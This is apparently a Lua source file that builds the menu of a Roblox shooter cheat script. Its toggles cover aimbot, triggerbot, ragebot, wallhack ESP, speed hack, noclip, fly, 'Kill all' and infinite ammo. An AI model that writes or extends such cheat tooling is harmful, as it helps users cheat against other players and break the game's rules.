LegitSections.Aimbot:AddToggle('AimbotShowFOV', {Text = 'Show FOV', Default = false, ColorPicker = {Idx = 'AimbotFOVColor', Default = Color3.fromRGB(255, 255, 255), Title = 'FOV color'}})
LegitSections.Aimbot:AddDropdown('AimbotHitbox', {
    Values = { 'Head', 'Body', 'Arms', 'Legs' },
    Default = 1,
    Multi = true,
    Text = 'Hitbox',
})
LegitSections.Aimbot:AddSlider('AimbotFOV', {Text = 'FOV', Default = 45, Min = 1, Max = 180, Rounding = 0})
LegitSections.Aimbot:AddSlider('AimbotSmooth', {Text = 'Smooth', Default = 4, Min = 1, Max = 10, Rounding = 0})
LegitSections.Aimbot:AddToggle('AimbotAutoScope', {Text = 'Auto scope', Default = false})
LegitSections.Aimbot:AddToggle('AimbotMultiPoint', {Text = 'Multi Point', Default = false})

LegitSections.Triggerbot:AddToggle('TriggerbotEnable', {Text = 'Enable', Default = false, KeyPicker = {Idx = 'TriggerbotKeybind', Default = 'None', Mode = 'Toggle', Text = 'Trigger bot'}})
LegitSections.Triggerbot:AddToggle('TriggerbotTeamCheck', {Text = 'Team check', Default = false})
LegitSections.Triggerbot:AddDropdown('TriggerbotHitbox', {
    Values = { 'Head', 'Body', 'Arms', 'Legs' },
    Default = 1,
    Multi = true,
    Text = 'Hitbox',
})
LegitSections.Triggerbot:AddDropdown('TriggerbotChecks', {
    Values = { 'Flash', 'Smoke', 'Air', 'Scope' },
    Default = {},
    Multi = true,
    Text = 'Checks',
})
LegitSections.Triggerbot:AddToggle('TriggerbotMagnet', {Text = 'Magnet', Default = false})
LegitSections.Triggerbot:AddToggle('TriggerbotMultiPoint', {Text = 'Multi Point', Default = false})
LegitSections.Triggerbot:AddSlider('TriggerbotDelay', {Text = 'Trigger bot delay', Default = 0, Min = 0, Max = 300, Rounding = 0, Suffix = 'ms'})
LegitSections.Triggerbot:AddSlider('TriggerbotHitChance', {Text = 'Hit chance', Default = 75, Min = 1, Max = 100, Rounding = 0, Suffix = '%'})

LegitSections.RCS:AddToggle('RCSEnable', {Text = 'Enable', Default = false, Callback = function() updateRCS() end})
LegitSections.RCS:AddSlider('RCSValue', {Text = 'RCS', Default = 1, Min = 1, Max = 100, Rounding = 0, Callback = function() updateRCS() end})

local VisualTabbox = Tabs.Visual:AddLeftTabbox('ESP & Viewmodel')
local espTab = VisualTabbox:AddTab('ESP')
local fontsTab = VisualTabbox:AddTab('Fonts')
local viewmodelTab = VisualTabbox:AddTab('Viewmodel')

local WorldSections = {
    Ambience = Tabs.World:AddLeftGroupbox('Ambience'),
    Lighting = Tabs.World:AddRightGroupbox('Lighting'),
}

local MiscSections = {
    NameSpoofer = Tabs.Misc:AddLeftGroupbox('Name Spoofer'),
    General = Tabs.Misc:AddRightGroupbox('General'),
}

local VisualSections = {
    ThirdPerson = Tabs.Visual:AddLeftGroupbox('Third person'),
    Menu = Tabs.Visual:AddLeftGroupbox('Menu'),
    Removals = Tabs.Visual:AddRightGroupbox('Removals'),
    Grenades = Tabs.Visual:AddRightGroupbox('Grenades'),
    DamageIndicators = Tabs.Visual:AddRightGroupbox('Damage Indicators'),
    BulletImpact = Tabs.Visual:AddRightGroupbox('Bullet Impact'),
    Misc = Tabs.Visual:AddRightGroupbox('Misc'),
    FOVChanger = Tabs.Visual:AddLeftGroupbox('FOV Changer'),
}

local KnifeTabbox = Tabs.Skin:AddLeftTabbox('Knife Changer')
local WeaponTabbox = Tabs.Skin:AddRightTabbox('Weapon Skins')
local GloveTabbox = Tabs.Skin:AddRightTabbox('Glove Changer')

local SkinSections = {
    Knife = KnifeTabbox:AddTab('Visual'),
    KnifeInventory = KnifeTabbox:AddTab('Inventory'),
    Weapon = WeaponTabbox:AddTab('Visual'),
    WeaponInventory = WeaponTabbox:AddTab('Inventory'),
    Glove = GloveTabbox:AddTab('Visual'),
    GloveInventory = GloveTabbox:AddTab('Inventory'),
}
local function SC_setDropdown(opt, values, value)
    if not opt then return end
    opt.Values = values
    opt:SetValues(values)
    opt:SetValue(value)
end
local function SC_syncSkin(modelOpt, skinOpt, map, saved, fallback)
    local model = modelOpt and modelOpt.Value
    if not model or not skinOpt then return end
    local skins = map[model] or {fallback}
    SC_setDropdown(skinOpt, skins, saved[model] or skins[1] or fallback)
end
local function SC_savePair(modelOpt, skinOpt, saved)
    local m, s = modelOpt and modelOpt.Value, skinOpt and skinOpt.Value
    if m and s then saved[m] = s; SC.SaveSkins() end
end
local function SC_randomize(list, map, saved, skinOpt, modelOpt, fallback)
    for _, name in ipairs(list) do
        local skins = map[name]
        if skins and #skins > 0 then saved[name] = skins[math.random(1, #skins)] end
    end
    SC.SaveSkins()
    local cur = modelOpt and modelOpt.Value
    if cur and map[cur] and skinOpt then skinOpt:SetValue(saved[cur] or fallback) end
    return cur
end

SkinSections.Knife:AddToggle('SkinKnifeChanger', {Text = 'Enable', Default = false, Callback = function()
    if Toggles.SkinKnifeChanger.Value then
        local kn = Options.SkinKnifeModel and Options.SkinKnifeModel.Value
        if kn then SC.SwapKnifeModel(kn) end
    else
        SC.restoreDefaultKnives()
        SC.State.currentKnife = nil
    end
end})
SkinSections.Knife:AddDropdown('SkinKnifeModel', {
    Text = 'Knife', Values = #SC.AllKnives > 0 and SC.AllKnives or {"CT Knife"}, Default = 'Butterfly Knife',
    Callback = function()
        SC_syncSkin(Options.SkinKnifeModel, Options.SkinKnifeSkin, SC.KnifeSkins, SC.State.SavedKnifeSkins, "Inventory")
        if Toggles.SkinKnifeChanger and Toggles.SkinKnifeChanger.Value then
            local kn = Options.SkinKnifeModel and Options.SkinKnifeModel.Value
            if kn then SC.SwapKnifeModel(kn) end
        end
    end,
})
do
    local kn = (Options.SkinKnifeModel and Options.SkinKnifeModel.Value) or "Butterfly Knife"
    SkinSections.Knife:AddDropdown('SkinKnifeSkin', {
        Text = 'Knife Skin', Values = SC.KnifeSkins[kn] or {"Inventory"},
        Default = SC.State.SavedKnifeSkins[kn] or "Inventory",
        Callback = function() SC_savePair(Options.SkinKnifeModel, Options.SkinKnifeSkin, SC.State.SavedKnifeSkins) end,
    })
end
task.defer(function() SC_syncSkin(Options.SkinKnifeModel, Options.SkinKnifeSkin, SC.KnifeSkins, SC.State.SavedKnifeSkins, "Inventory") end)

SkinSections.Weapon:AddToggle('SkinWeaponChanger', {Text = 'Enable', Default = false})
local _SC_prevWeapon = SC.AllWeapons[1]
SkinSections.Weapon:AddDropdown('SkinWeaponModel', {
    Text = 'Weapon', Values = #SC.AllWeapons > 0 and SC.AllWeapons or {"AK-47"}, Default = SC.AllWeapons[1] or "AK-47",
    Callback = function()
        local wn = Options.SkinWeaponModel and Options.SkinWeaponModel.Value
        if _SC_prevWeapon and _SC_prevWeapon ~= wn then
            local cur = Options.SkinWeaponSkin and Options.SkinWeaponSkin.Value
            if cur then SC.State.SavedWeaponSkins[_SC_prevWeapon] = cur; SC.SaveSkins() end
        end
        _SC_prevWeapon = wn
        SC_syncSkin(Options.SkinWeaponModel, Options.SkinWeaponSkin, SC.AllSkins, SC.State.SavedWeaponSkins, "Inventory")
    end,
})
do
    local wn = (Options.SkinWeaponModel and Options.SkinWeaponModel.Value) or (SC.AllWeapons[1] or "AK-47")
    SkinSections.Weapon:AddDropdown('SkinWeaponSkin', {
        Text = 'Weapon Skin', Values = SC.AllSkins[wn] or {"Inventory"},
        Default = SC.State.SavedWeaponSkins[wn] or "Inventory",
        Callback = function() SC_savePair(Options.SkinWeaponModel, Options.SkinWeaponSkin, SC.State.SavedWeaponSkins) end,
    })
end
task.defer(function() SC_syncSkin(Options.SkinWeaponModel, Options.SkinWeaponSkin, SC.AllSkins, SC.State.SavedWeaponSkins, "Inventory") end)

SkinSections.Glove:AddToggle('SkinGloveChanger', {Text = 'Enable', Default = false})
if #SC.AllGloveNames > 0 then
    SkinSections.Glove:AddDropdown('SkinGloveModel', {
        Text = 'Glove', Values = SC.AllGloveNames, Default = SC.AllGloveNames[1],
        Callback = function()
            SC_syncSkin(Options.SkinGloveModel, Options.SkinGloveSkin, SC.AllGloves, SC.State.SavedGloveSkins, "Default")
            local gn = Options.SkinGloveModel and Options.SkinGloveModel.Value
            SC.lastGlove, SC.lastGloveSkin = gn, SC.State.SavedGloveSkins[gn] or (SC.AllGloves[gn] and SC.AllGloves[gn][1])
        end,
    })
    do
        local gn = (Options.SkinGloveModel and Options.SkinGloveModel.Value) or SC.AllGloveNames[1]
        local skins = SC.AllGloves[gn] or {"Default"}
        SkinSections.Glove:AddDropdown('SkinGloveSkin', {
            Text = 'Glove Skin', Values = skins, Default = SC.State.SavedGloveSkins[gn] or skins[1] or "Default",
            Callback = function()
                SC.lastGlove = Options.SkinGloveModel and Options.SkinGloveModel.Value
                SC.lastGloveSkin = Options.SkinGloveSkin and Options.SkinGloveSkin.Value
                SC_savePair(Options.SkinGloveModel, Options.SkinGloveSkin, SC.State.SavedGloveSkins)
            end,
        })
    end
    task.defer(function() SC_syncSkin(Options.SkinGloveModel, Options.SkinGloveSkin, SC.AllGloves, SC.State.SavedGloveSkins, "Default") end)
end

SkinSections.Knife:AddButton('Random Skin', function()
    SC_randomize(SC.AllKnives, SC.KnifeSkins, SC.State.SavedKnifeSkins, Options.SkinKnifeSkin, Options.SkinKnifeModel, "Inventory")
end)
SkinSections.Weapon:AddButton('Random Skin', function()
    SC_randomize(SC.AllWeapons, SC.AllSkins, SC.State.SavedWeaponSkins, Options.SkinWeaponSkin, Options.SkinWeaponModel, "Inventory")
end)
SkinSections.Glove:AddButton('Random Skin', function()
    local cur = SC_randomize(SC.AllGloveNames, SC.AllGloves, SC.State.SavedGloveSkins, Options.SkinGloveSkin, Options.SkinGloveModel, "Default")
    if cur then SC.lastGlove, SC.lastGloveSkin = cur, SC.State.SavedGloveSkins[cur] end
end)

SkinSections.KnifeInventory:AddToggle('SkinInvKnifeEnable', {Text = 'Enable', Default = false})
SkinSections.KnifeInventory:AddDropdown('SkinInvKnifeModel', {
    Text = 'Knife', Values = #SC.AllKnives > 0 and SC.AllKnives or {"CT Knife"}, Default = 'Butterfly Knife',
    Callback = function() SC_syncSkin(Options.SkinInvKnifeModel, Options.SkinInvKnifeSkin, SC.KnifeSkins, SC.State.InvKnifeSkins, "Inventory") end,
})
do
    local kn = (Options.SkinInvKnifeModel and Options.SkinInvKnifeModel.Value) or "Butterfly Knife"
    SkinSections.KnifeInventory:AddDropdown('SkinInvKnifeSkin', {
        Text = 'Knife Skin', Values = SC.KnifeSkins[kn] or {"Inventory"},
        Default = SC.State.InvKnifeSkins[kn] or "Inventory",
        Callback = function() SC_savePair(Options.SkinInvKnifeModel, Options.SkinInvKnifeSkin, SC.State.InvKnifeSkins) end,
    })
end
task.defer(function() SC_syncSkin(Options.SkinInvKnifeModel, Options.SkinInvKnifeSkin, SC.KnifeSkins, SC.State.InvKnifeSkins, "Inventory") end)

SkinSections.WeaponInventory:AddToggle('SkinInvWeaponEnable', {Text = 'Enable', Default = false})
local _SC_prevInvWeapon = SC.AllWeapons[1]
SkinSections.WeaponInventory:AddDropdown('SkinInvWeaponModel', {
    Text = 'Weapon', Values = #SC.AllWeapons > 0 and SC.AllWeapons or {"AK-47"}, Default = SC.AllWeapons[1] or "AK-47",
    Callback = function()
        local wn = Options.SkinInvWeaponModel and Options.SkinInvWeaponModel.Value
        if _SC_prevInvWeapon and _SC_prevInvWeapon ~= wn then
            local cur = Options.SkinInvWeaponSkin and Options.SkinInvWeaponSkin.Value
            if cur then SC.State.InvWeaponSkins[_SC_prevInvWeapon] = cur; SC.SaveSkins() end
        end
        _SC_prevInvWeapon = wn
        SC_syncSkin(Options.SkinInvWeaponModel, Options.SkinInvWeaponSkin, SC.AllSkins, SC.State.InvWeaponSkins, "Inventory")
    end,
})
do
    local wn = (Options.SkinInvWeaponModel and Options.SkinInvWeaponModel.Value) or (SC.AllWeapons[1] or "AK-47")
    SkinSections.WeaponInventory:AddDropdown('SkinInvWeaponSkin', {
        Text = 'Weapon Skin', Values = SC.AllSkins[wn] or {"Inventory"},
        Default = SC.State.InvWeaponSkins[wn] or "Inventory",
        Callback = function() SC_savePair(Options.SkinInvWeaponModel, Options.SkinInvWeaponSkin, SC.State.InvWeaponSkins) end,
    })
end
task.defer(function() SC_syncSkin(Options.SkinInvWeaponModel, Options.SkinInvWeaponSkin, SC.AllSkins, SC.State.InvWeaponSkins, "Inventory") end)

SkinSections.GloveInventory:AddToggle('SkinInvGloveEnable', {Text = 'Enable', Default = false})
if #SC.AllGloveNames > 0 then
    SkinSections.GloveInventory:AddDropdown('SkinInvGloveModel', {
        Text = 'Glove', Values = SC.AllGloveNames, Default = SC.AllGloveNames[1],
        Callback = function() SC_syncSkin(Options.SkinInvGloveModel, Options.SkinInvGloveSkin, SC.AllGloves, SC.State.InvGloveSkins, "Default") end,
    })
    do
        local gn = (Options.SkinInvGloveModel and Options.SkinInvGloveModel.Value) or SC.AllGloveNames[1]
        local skins = SC.AllGloves[gn] or {"Default"}
        SkinSections.GloveInventory:AddDropdown('SkinInvGloveSkin', {
            Text = 'Glove Skin', Values = skins, Default = SC.State.InvGloveSkins[gn] or skins[1] or "Default",
            Callback = function() SC_savePair(Options.SkinInvGloveModel, Options.SkinInvGloveSkin, SC.State.InvGloveSkins) end,
        })
    end
    task.defer(function() SC_syncSkin(Options.SkinInvGloveModel, Options.SkinInvGloveSkin, SC.AllGloves, SC.State.InvGloveSkins, "Default") end)
end

local InvSections = { All = Tabs.Skin:AddLeftGroupbox('Inv Unlock') }
InvSections.All:AddButton('Unlock All Skins', function() end)

SC.setupArmsWatcher()

local MovementSections = {

    Bhop = Tabs.Movement:AddLeftGroupbox('Bhop'),

    SpeedHack = Tabs.Movement:AddLeftGroupbox('Speed Hack'),
    LegitBhop = Tabs.Movement:AddRightGroupbox('Legit Bhop'),
    Misc = Tabs.Movement:AddRightGroupbox('Misc'),
    Exploits = Tabs.Movement:AddRightGroupbox('Exploits'),
}
MovementSections.SpeedHack:AddToggle('SpeedHackEnable', {Text = 'Enable', Default = false, Callback = function() updateSpeedHack() end, KeyPicker = {Idx = 'SpeedHackKeybind', Default = 'None', Mode = 'Hold', Text = 'Speed Hack'}})
MovementSections.SpeedHack:AddSlider('SpeedHackSpeed', {Text = 'Speed', Default = 50, Min = 16, Max = 500, Rounding = 0})
MovementSections.Exploits:AddToggle('NoclipEnable', {Text = 'Noclip', Default = false, Callback = function() updateNoclip() end})
MovementSections.Exploits:AddToggle('FlyEnable', {Text = 'Fly', Default = false, Callback = function() updateFly() end})
MovementSections.Exploits:AddSlider('FlySpeed', {Text = 'Fly speed', Default = 50, Min = 10, Max = 300, Rounding = 0})
MovementSections.LegitBhop:AddToggle('LegitBhopEnable', {Text = 'Enable', Default = false, Callback = function() updateLegitBhop() end})
MovementSections.LegitBhop:AddSlider('LegitBhopMultiplier', {Text = 'Multiplier', Default = 2, Min = 1, Max = 3, Rounding = 1})
MovementSections.Bhop:AddToggle('BhopEnable', {Text = 'Enable', Default = false, Callback = function() updateBhop() end})
MovementSections.Bhop:AddSlider('BhopMultiplier', {Text = 'Bhop multiplier', Default = 1, Min = 1, Max = 5, Rounding = 2})
MovementSections.Misc:AddToggle('AutoJumpEnable', {Text = 'Auto jump', Default = false, Callback = function() updateAutoJump() end})
MovementSections.Misc:AddToggle('AutoCrouchEnable', {Text = 'Auto crouch (on jump)', Default = false, Callback = function() updateAutoCrouch() end})
MovementSections.Misc:AddToggle('FakeDuckEnable', {Text = 'Fake duck', Default = false, Callback = function() updateFakeDuck() end, KeyPicker = {Idx = 'FakeDuckKeybind', Default = 'V', Mode = 'Hold', Text = 'Fake duck'}})

RageSections.Ragebot:AddToggle('RagebotEnable', {Text = 'Enable', Default = false, KeyPicker = {Idx = 'RagebotKeybind', Default = 'None', Mode = 'Hold', Text = 'Ragebot'}})
RageSections.Ragebot:AddToggle('RagebotAutoFire', {Text = 'Auto Fire', Default = false})
RageSections.Ragebot:AddToggle('RagebotAutoScope', {Text = 'Auto Scope', Default = false})
RageSections.Ragebot:AddToggle('RagebotTeamCheck', {Text = 'Team Check', Default = false})
RageSections.Ragebot:AddToggle('RagebotAutoPenetration', {Text = 'Auto Penetration', Default = true})
RageSections.Ragebot:AddDropdown('RagebotHitbox', {
    Values = { 'Head', 'Body', 'Arms', 'Legs' },
    Default = 1,
    Multi = true,
    Text = 'Hitbox',
})
RageSections.Ragebot:AddSlider('SilentAimMaxWalls', {Text = 'Max Walls', Default = 3, Min = 1, Max = 15, Rounding = 0})
RageSections.Ragebot:AddToggle('RagebotMultiPoint', {Text = 'Multi Point', Default = false})
RageSections.Ragebot:AddToggle('RagebotForwardTrack', {Text = 'ForwardTrack', Default = false})
RageSections.Ragebot:AddSlider('RagebotForwardTrackTime', {Text = 'ForwardTrack Time', Default = 1, Min = 1, Max = 4, Rounding = 1, Suffix = 's'})

if HitpartSilent.refreshMethod then HitpartSilent.refreshMethod() end

antiAimPitchTab:AddToggle('AntiAimPitchEnable', {Text = 'Enable', Default = false})
antiAimPitchTab:AddDropdown('AntiAimPitchMode', {Values = { 'None', 'Down', 'Up', 'Random', 'Custom' }, Default = 'None', Text = 'Pitch'})
antiAimPitchTab:AddSlider('AntiAimPitchCustom', {Text = 'Custom value', Default = 0, Min = -1, Max = 1, Rounding = 2})
antiAimPitchTab:AddSlider('AntiAimPitchRandomSpeed', {Text = 'Pitch random speed (ms)', Default = 1, Min = 1, Max = 1000, Rounding = 0})

antiAimYawTab:AddToggle('AntiAimYawEnable', {Text = 'Enable', Default = false})
antiAimYawTab:AddDropdown('AntiAimYawMode', {Values = { 'Local', 'At target' }, Default = 'Local', Text = 'Yaw mode'})
antiAimYawTab:AddDropdown('AntiAimYawDirection', {Values = { 'Backwards', 'Forwards' }, Default = 'Backwards', Text = 'Direction'})
antiAimYawTab:AddDropdown('AntiAimYawType', {Values = { 'None', 'Spin', 'Jitter' }, Default = 'None', Text = 'Yaw type'})
antiAimYawTab:AddSlider('AntiAimYawJitterAngle', {Text = 'Jitter angle', Default = 90, Min = 0, Max = 180, Rounding = 0, Suffix = '°'})
antiAimYawTab:AddSlider('AntiAimYawJitterDelay', {Text = 'Jitter delay (ms)', Default = 100, Min = 1, Max = 1000, Rounding = 0})
antiAimYawTab:AddSlider('AntiAimYawSpinDelay', {Text = 'Spin delay (ms)', Default = 5, Min = 1, Max = 1000, Rounding = 0})

RageSections.PeekAssist:AddToggle('PeekAssistEnable', {Text = 'Enable', Default = false, KeyPicker = {Idx = 'PeekAssistKeybind', Default = 'None', Mode = 'Hold', Text = 'Peek Assist'}})
RageSections.PeekAssist:AddDropdown('PeekAssistRetreatMode', {Values = { 'On Key', 'On Shot' }, Default = 'On Key', Text = 'Retreat Mode'})

RageSections.GunMods:AddToggle('GunModsNoRecoil', {Text = 'No recoil', Default = false, Callback = applyNoRecoil})
RageSections.GunMods:AddToggle('GunModsNoSpread', {Text = 'No spread', Default = false, Callback = applyNoSpread})
RageSections.GunMods:AddToggle('GunModsRapidFire', {Text = 'Rapid fire', Default = false, Callback = function(Value) if not Value then restoreAllRapidFireRates() else updateRapidFire() end end})
RageSections.GunMods:AddSlider('GunModsRapidFireRate', {
    Text = 'Rapid fire rate',
    Default = 1,
    Min = 1,
    Max = 50,
    Rounding = 1,
    Callback = function(Value)
        local snapped = math.clamp(math.floor((Value or 1) * 2 + 0.5) / 2, 1, 50)
        local slider = Options.GunModsRapidFireRate
        if slider and slider.Value ~= snapped then
            slider.Value = snapped
            slider:Display()
        end
        if Toggles.GunModsRapidFire and Toggles.GunModsRapidFire.Value then
            updateRapidFire()
        end
    end,
})
RageSections.GunMods:AddToggle('GunModsInstaEquip', {Text = 'Insta equip', Default = false, Callback = applyInstaEquip})

RageSections.GunMods:AddToggle('GunModsInstaReload', {Text = 'Insta reload', Default = false, Callback = applyInstaReload})
RageSections.GunMods:AddToggle('MiscFullAuto', {Text = 'Full auto', Default = false, Callback = function() updateFullAuto() end})

VisualSections.BulletImpact:AddToggle('MiscBulletTracer', {Text = 'Bullet tracer', Default = false, ColorPicker = {Idx = 'MiscBulletTracerColor', Default = Color3.fromRGB(150, 20, 60), Title = 'Bullet tracer color'}})
VisualSections.BulletImpact:AddToggle('MiscBulletTracerFaceCamera', {Text = 'Face camera', Default = false})
VisualSections.BulletImpact:AddDropdown('MiscBulletTracerTexture', {
    Text = 'Tracer texture',
    Values = {"Solid","Lightning","Laser","Twisted Energy","Anime Lazer","Arrow","Minecraft","Alien Energy Ray","Energy Ray","Matrix","Cartoony Eletric"},
    Default = "Solid",
})

VisualSections.Grenades:AddToggle('GrenadesPrediction', {Text = 'Grenade prediction', Default = false, ColorPicker = {Idx = 'GrenadesPredictionColor', Default = Color3.fromRGB(255, 50, 50), Title = 'Prediction color'}})

VisualSections.DamageIndicators:AddToggle('MiscHitSound', {Text = 'Hit sound', Default = false})
VisualSections.DamageIndicators:AddDropdown('MiscHitSoundType', {Values = { 'Skeet', 'Neverlose', 'Bameware', 'Bell', 'Bubble', 'Pick', 'Pop', 'Rust', 'Sans', 'Fart', 'Big', 'Vine', 'Bruh', 'Fatality', 'Bonk', 'Minecraft', 'Moan' }, Default = 'Skeet', Text = 'Hit sound type'})
VisualSections.DamageIndicators:AddSlider('MiscHitSoundVolume', {Text = 'Volume', Default = 5, Min = 1, Max = 10, Rounding = 0})
VisualSections.DamageIndicators:AddToggle('MiscHitChams', {Text = 'Hit chams', Default = false, ColorPicker = {Idx = 'MiscHitChamsColor', Default = Color3.fromRGB(200, 30, 80), Title = 'Hit chams color'}})
VisualSections.DamageIndicators:AddSlider('MiscHitChamsLifetime', {Text = 'Hit chams time (s)', Default = 1.3, Min = 1, Max = 5, Rounding = 1})
VisualSections.DamageIndicators:AddToggle('MiscHitMarker', {Text = 'Hit marker', Default = false, ColorPicker = {Idx = 'MiscHitMarkerColor', Default = Color3.fromRGB(255, 255, 255), Title = 'Hit marker color'}})
VisualSections.DamageIndicators:AddSlider('MiscHitMarkerLifetime', {Text = 'Hit marker time (s)', Default = 0.6, Min = 0.2, Max = 5, Rounding = 1})

VisualSections.Misc:AddToggle('MiscCenterDot', {Text = 'Center dot', Default = true, ColorPicker = {Idx = 'MiscCenterDotColor', Default = Color3.fromRGB(255, 255, 255), Title = 'Center dot color'}})
VisualSections.Misc:AddToggle('MiscSpreadVisualizer', {Text = 'Spread visualizer', Default = false, ColorPicker = {Idx = 'MiscSpreadVisualizerColor', Default = Color3.fromRGB(255, 180, 60), Title = 'Spread color'}})
VisualSections.Misc:AddToggle('MiscHitLog', {Text = 'Hit log', Default = false})
VisualSections.Misc:AddSlider('MiscHitLogLifetime', {Text = 'Hit log time (s)', Default = 3, Min = 0.5, Max = 6, Rounding = 1})
VisualSections.Misc:AddToggle('MiscStateIndicator', {Text = 'State indicator', Default = false, ColorPicker = {Idx = 'MiscStateIndicatorColor', Default = Color3.fromRGB(255, 255, 255), Title = 'State indicator color'}})
VisualSections.Misc:AddToggle('MiscHideCrosshair', {Text = 'Hide game crosshair', Default = false})

viewmodelTab:AddToggle('VMOffsetEnable', {Text = 'Viewmodel offset', Default = false})
viewmodelTab:AddSlider('VMOffsetX', {Text = 'X', Default = 0, Min = -25, Max = 25, Rounding = 1, Suffix = ''})
viewmodelTab:AddSlider('VMOffsetY', {Text = 'Y', Default = 0, Min = -25, Max = 25, Rounding = 1, Suffix = ''})
viewmodelTab:AddSlider('VMOffsetZ', {Text = 'Z', Default = 0, Min = -25, Max = 25, Rounding = 1, Suffix = ''})
viewmodelTab:AddSlider('VMRoll', {Text = 'Roll', Default = 0, Min = 0, Max = 360, Rounding = 1, Suffix = '°'})

viewmodelTab:AddToggle('VMWeaponChams', {Text = 'Weapon chams', Default = false, ColorPicker = {Idx = 'VMWeaponColor', Default = Color3.fromRGB(255, 255, 255), Title = 'Weapon color', Transparency = 0}, Callback = function() updateViewModelVisuals() end})
viewmodelTab:AddDropdown('VMWeaponMaterial', {Values = {'SmoothPlastic', 'Neon', 'ForceField', 'Glass'}, Default = 'SmoothPlastic', Text = 'Weapon material', Callback = function() updateViewModelVisuals() end})
viewmodelTab:AddSlider('VMWeaponTransparency', {Text = 'Weapon transparency', Default = 0, Min = 0, Max = 100, Rounding = 0, Suffix = '%', Callback = function() updateViewModelVisuals() end})
viewmodelTab:AddSlider('VMWeaponReflectance', {Text = 'Weapon reflectance', Default = 0, Min = 0, Max = 100, Rounding = 0, Suffix = '%', Callback = function() updateViewModelVisuals() end})

viewmodelTab:AddToggle('VMArmChams', {Text = 'Arm chams', Default = false, ColorPicker = {Idx = 'VMArmColor', Default = Color3.fromRGB(255, 255, 255), Title = 'Arm color', Transparency = 0}, Callback = function() updateViewModelVisuals() end})
viewmodelTab:AddDropdown('VMArmMaterial', {Values = {'SmoothPlastic', 'Neon', 'ForceField', 'Glass'}, Default = 'SmoothPlastic', Text = 'Arm material', Callback = function() updateViewModelVisuals() end})
viewmodelTab:AddSlider('VMArmTransparency', {Text = 'Arm transparency', Default = 0, Min = 0, Max = 100, Rounding = 0, Suffix = '%', Callback = function() updateViewModelVisuals() end})

viewmodelTab:AddToggle('VMRemoveSleeves', {Text = 'Remove sleeves', Default = false, Callback = function() updateViewModelVisuals() end})
viewmodelTab:AddToggle('VMRemoveGloves', {Text = 'Remove gloves', Default = false, Callback = function() updateViewModelVisuals() end})

RageSections.Exploit:AddToggle('ExploitKillAll', {Text = 'Kill all', Default = false, KeyPicker = {Idx = 'ExploitKillAllKeybind', Default = 'None', Mode = 'Hold', Text = 'Kill All'}})
RageSections.Exploit:AddToggle('ExploitNoFallDamage', {Text = 'No fall damage', Default = false})
RageSections.Exploit:AddToggle('ExploitNoFireDamage', {Text = 'No fire damage', Default = false})
RageSections.Exploit:AddToggle('ExploitInfAmmo', {Text = 'Inf ammo', Default = false, Callback = function(enabled)
    if enabled then
        InfAmmoState.table = nil
        InfAmmoState.scanBackoff = 0.5
        requestClientAmmoScan(true)
    end
end})
espTab:AddToggle('ESPEnable', {Text = 'Enable', Default = false})

espTab:AddToggle('ESPTeamCheck', {Text = 'Team check', Default = false})
espTab:AddToggle('ESPBox', {Text = 'Box', Default = false, ColorPicker = {Idx = 'ESPBoxColor', Default = Color3.fromRGB(255, 255, 255), Title = 'Box color'}})
espTab:AddToggle('ESPBoxFill', {Text = 'Box fill', Default = false, ColorPicker = {Idx = 'ESPBoxFillColor', Default = Color3.fromRGB(255, 255, 255), Transparency = 0.5, Title = 'Box fill color'}})
espTab:AddToggle('ESPName', {Text = 'Name', Default = false, ColorPicker = {Idx = 'ESPNameColor', Default = Color3.fromRGB(255, 255, 255), Title = 'Name color'}})
do
    local hbToggle = espTab:AddToggle('ESPHealthBar', {
        Text = 'Health bar',
        Default = false,
        ColorPicker = {
            Idx = 'ESPHealthBarHighColor',
            Default = Color3.fromRGB(0, 255, 0),
            Title = 'High HP',
        },
    })
    hbToggle:AddColorPicker('ESPHealthBarLowColor', {
        Default = Color3.fromRGB(255, 0, 0),
        Title = 'Low HP',
    })
end
espTab:AddToggle('ESPHealthBarOutline', {Text = 'Health bar outline', Default = true})
espTab:AddToggle('ESPWeapon', {Text = 'Weapon ESP', Default = false, ColorPicker = {Idx = 'ESPWeaponColor', Default = Color3.fromRGB(255, 255, 255), Title = 'Weapon color'}})
do
    local chamsToggle = espTab:AddToggle('ESPChams', {
        Text = 'Chams',
        Default = false,
        ColorPicker = {
            Idx = 'ESPChamsVisibleColor',
            Default = Color3.fromRGB(0, 255, 120),
            Title = 'Visible',
            Transparency = 0.35,
        },
    })
    chamsToggle:AddColorPicker('ESPChamsWallColor', {
        Default = Color3.fromRGB(255, 60, 60),
        Title = 'Wall',
        Transparency = 0.35,
    })
    espTab:AddDropdown('ESPChamsType', {
        Text = 'Chams type',
        Values = { 'Part', 'Highlight' },
        Default = 'Highlight',
    })
end
espTab:AddToggle('ESPOofArrows', {Text = 'OOF arrows', Default = false, ColorPicker = {Idx = 'ESPOofColor', Default = Color3.fromRGB(255, 255, 255), Title = 'OOF color'}})
espTab:AddSlider('ESPOofSize', {Text = 'OOF size', Default = 12, Min = 4, Max = 30, Rounding = 0})
espTab:AddSlider('ESPOofDistance', {Text = 'OOF distance', Default = 40, Min = 10, Max = 100, Rounding = 0, Suffix = '%'})
espTab:AddToggle('ESPItemESP', {Text = 'Item ESP', Default = false, ColorPicker = {Idx = 'ESPItemColor', Default = Color3.fromRGB(255, 255, 255), Title = 'Item color'}})

fontsTab:AddDropdown('ESPFont', {
    Text = 'Font',
    Values = { 'UI', 'System', 'Plex', 'Monospace' },
    Default = 'Plex',
})
fontsTab:AddSlider('ESPFontSize', {Text = 'Font size', Default = 13, Min = 1, Max = 30, Rounding = 0})

VisualSections.Menu:AddToggle('MenuBindList', {Text = 'Bind list', Default = true, Callback = function(Value) if Library.KeybindFrame then Library.KeybindFrame.Visible = Value end end})

VisualSections.Menu:AddToggle('MenuWatermark', {Text = 'Watermark', Default = true, Callback = function(Value) Library:SetWatermarkVisibility(Value) end})

VisualSections.Removals:AddToggle('RemovalsNoSmoke', {Text = 'No smoke', Default = false, Callback = function() setupNoSmoke() end})
VisualSections.Removals:AddToggle('RemovalsNoFlash', {Text = 'No flash', Default = false, Callback = function() updateNoFlash() end})
VisualSections.Removals:AddToggle('RemovalsNoScope', {Text = 'No scope', Default = false, Callback = function() updateNoScope() end})

VisualSections.ThirdPerson:AddToggle('ThirdPersonEnable', {Text = 'Enable', Default = false, KeyPicker = {Idx = 'ThirdPersonKeybind', Default = 'None', Mode = 'Toggle', Text = 'Third person'}})
VisualSections.ThirdPerson:AddSlider('ThirdPersonDistance', {Text = 'Distance', Default = 5, Min = 1, Max = 100, Rounding = 0})
